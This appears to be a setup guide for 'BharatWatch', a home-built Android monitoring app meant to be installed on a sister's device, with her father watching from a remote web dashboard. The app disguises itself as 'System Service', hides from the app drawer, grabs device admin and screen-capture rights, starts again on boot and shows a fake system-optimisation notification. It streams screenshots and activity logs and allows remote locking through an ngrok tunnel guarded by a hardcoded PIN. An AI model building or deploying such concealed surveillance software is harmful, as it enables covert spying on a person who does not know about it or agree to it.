# 🛡️ BharatWatch Setup Guide

> A simple parental monitoring app. Your father can watch BharatBook activity from his phone.

---

## Step 1 — Start the Server (on your MacBook)

Open Terminal and run:

```bash
cd ~/Desktop/Tracking
npm start
```

You should see:
```
🛡️  BharatWatch Server Running
Dashboard:  http://localhost:3000
PIN: 1972
```

✅ Server is running. Keep this terminal open.

---

## Step 2 — Check the Dashboard

1. Open browser → go to **http://localhost:3000**
2. Enter PIN → **1972**
3. You'll see the monitoring dashboard (it'll show "Offline" until BharatBook connects)

---

## Step 3 — Install Android Studio (if not installed)

You need Android Studio to build the APK.

```bash
brew install --cask android-studio
```

Or download from: https://developer.android.com/studio

---

## Step 4 — Find Your MacBook's IP Address

In Terminal, run:

```bash
ipconfig getifaddr en0
```

It will show something like `192.168.1.5` — **note this down**.

---

## Step 5 — Set Your IP in the Android App

Open this file in any editor:

```
android-agent/app/src/main/java/com/system/optimizer/Config.kt
```

Find this line:

```kotlin
const val SERVER_URL = "ws://YOUR_SERVER_IP:3000/ws/agent"
```

Replace `YOUR_SERVER_IP` with your MacBook's IP from Step 4:

```kotlin
const val SERVER_URL = "ws://192.168.1.5:3000/ws/agent"
```

Save the file.

---

## Step 6 — Build the APK

1. Open **Android Studio**
2. Click **File → Open**
3. Select the `android-agent` folder inside `~/Desktop/Tracking/android-agent`
4. Wait for Gradle sync to finish (may take a few minutes first time)
5. Click **Build → Build Bundle(s) / APK(s) → Build APK(s)**
6. APK will be saved at:
   ```
   android-agent/app/build/outputs/apk/debug/app-debug.apk
   ```

---

## Step 7 — Send APK to BharatBook

Pick one method:

| Method | How |
|--------|-----|
| **USB** | Connect BharatBook to MacBook with cable → copy APK to Downloads |
| **Telegram** | Send APK to yourself on Telegram → open on BharatBook |
| **Google Drive** | Upload APK to Drive → download on BharatBook |
| **Email** | Email the APK to yourself → open on BharatBook |

---

## Step 8 — Install APK on BharatBook

1. Open the APK file on BharatBook
2. If it says "Install from unknown sources", tap **Settings → Allow**
3. Tap **Install**
4. App will appear as **"System Service"**

---

## Step 9 — First-Time Setup on BharatBook

Open **"System Service"** app. You'll see 3 permissions to grant:

### Permission 1: Usage Access
- Tap **"Grant"**
- Find **"System Service"** in the list
- Toggle it **ON**
- Go back to the app

### Permission 2: Device Admin
- Tap **"Enable"**
- Tap **"Activate this device admin app"**

### Permission 3: Start Service
- Tap **"Start Service"**
- Allow battery optimization bypass → **Yes**
- Allow screen capture → **Start now**

✅ Done! The app will:
- Start running in the background
- **Hide itself from the home screen** after 3 seconds

---

## Step 10 — Check Dashboard

Go back to your dashboard (**http://localhost:3000**, PIN: **1972**).

You should see:
- 🟢 Status: **Online**
- Battery level
- Current app being used
- You can now take screenshots, lock device, view activity

---

## What Your Sister Will See

| What | Details |
|------|---------|
| Notification | "System Service — Optimizing system performance..." |
| App drawer | App is **hidden** (not visible) |
| Can she close it? | **No** — it's a system-level notification |
| If she restarts phone? | App **auto-starts** on boot |

She'll just see a small notification that looks like a normal system thing. That's it.

---

## For Remote Access (Monitor from Anywhere)

Right now, your father needs to be on the **same WiFi** as your MacBook. To monitor from anywhere:

### Easy Way — ngrok

```bash
# Install (one time)
brew install ngrok

# Run (every time you want remote access)
ngrok http 3000
```

This gives a URL like: `https://abc123.ngrok-free.app`

- Father opens this URL on his phone → enters PIN **1972** → done!
- Also update `Config.kt` on BharatBook to use: `wss://abc123.ngrok-free.app/ws/agent`

---

## Finding the Hidden App Later

If you ever need to find the app on BharatBook:

**Settings → Apps → Show all apps → System Service**

---

## ✅ How to Use (After Setup is Complete)

Once everything is set up, here's what your **father** does daily:

### Opening the Dashboard

1. Open any browser on his phone/laptop
2. Go to the dashboard URL (e.g., `http://localhost:3000` or the ngrok/cloud URL)
3. Enter PIN → **1972**
4. He's in!

### What He Can Do

#### 📸 Take a Screenshot
- Click the **"Take Screenshot"** button on the Overview page
- A live screenshot of BharatBook's screen appears within 2 seconds
- Go to the **Screenshots** tab to see all past screenshots

#### 🔒 Lock the Device
- Click **"Lock Device"** → BharatBook instantly locks
- Use this when she should stop using the device (e.g., study time, bedtime)

#### 🔓 Unlock the Device
- Click **"Unlock Device"** → BharatBook's screen turns on
- She'll still need to swipe/enter her PIN to fully unlock

#### 📊 Check Screen Time
- Go to the **Screen Time** tab
- See a bar chart of how long each app was used today
- See a doughnut chart of usage by category (Study 🟢 / Entertainment 🔴 / Social 🟣)

#### 📜 View Activity Log
- Go to the **Activity** tab
- See a real-time timeline of every app opened/closed
- Each entry is color-coded by category:
  - 🟢 **Study** — Google Classroom, Byju's, Khan Academy, etc.
  - 🔴 **Entertainment** — YouTube, Netflix, games, etc.
  - 🟣 **Social** — Instagram, WhatsApp, Snapchat, etc.
  - 🟡 **Browser** — Chrome, Firefox, etc.

#### 📱 View Running Apps
- Go to the **Apps** tab
- See which apps are currently running in the foreground and background

### What Updates Automatically

| Data | Updates Every |
|------|--------------|
| Device status (online/offline) | Real-time |
| Current app being used | 15 seconds |
| Battery level | 15 seconds |
| Running apps list | 30 seconds |
| Activity log (app switches) | 30 seconds |
| Screen time stats | 5 minutes |

### Daily Routine for Father

1. **Morning** — Open dashboard, check if BharatBook is online
2. **Random check** — Take a screenshot to see what's on screen
3. **Study time** — Lock the device if she's not studying
4. **Evening** — Check Screen Time tab to see the full day's usage
5. **Night** — Lock the device at bedtime

### Important Notes

- ⚡ Your **MacBook must be running** with `npm start` active (unless deployed to cloud)
- 📶 BharatBook and MacBook must be on **same WiFi** (unless using ngrok/cloud)
- 🔄 If BharatBook restarts, the agent **auto-starts** — no action needed
- 🔋 The agent uses very little battery (~2-3%)

---

## Common Problems

| Problem | Fix |
|---------|-----|
| "Address already in use" when starting server | Run `kill -9 $(lsof -ti:3000)` then `npm start` |
| Dashboard shows "Offline" | Make sure BharatBook and MacBook are on same WiFi |
| Can't take screenshots | Re-open "System Service" on BharatBook, re-grant screen capture |
| App got killed by Android | Go to Settings → Battery → System Service → Don't optimize |
| Lock button not working | Re-enable Device Admin in Settings → Security |
| Forgot the PIN | Check `DASHBOARD_PIN` in `.env` file (default: **1972**) |
| Can't find the app | Settings → Apps → Show all apps → System Service |

---

## Quick Reference

| Thing | Value |
|-------|-------|
| Dashboard URL | http://localhost:3000 |
| Dashboard PIN | **1972** |
| Start server | `cd ~/Desktop/Tracking && npm start` |
| Kill stuck server | `kill -9 $(lsof -ti:3000)` |
| Find your IP | `ipconfig getifaddr en0` |
| Config file | `android-agent/.../Config.kt` |
| Find hidden app | Settings → Apps → System Service |

# Android-Tracking
# Android-Tracking
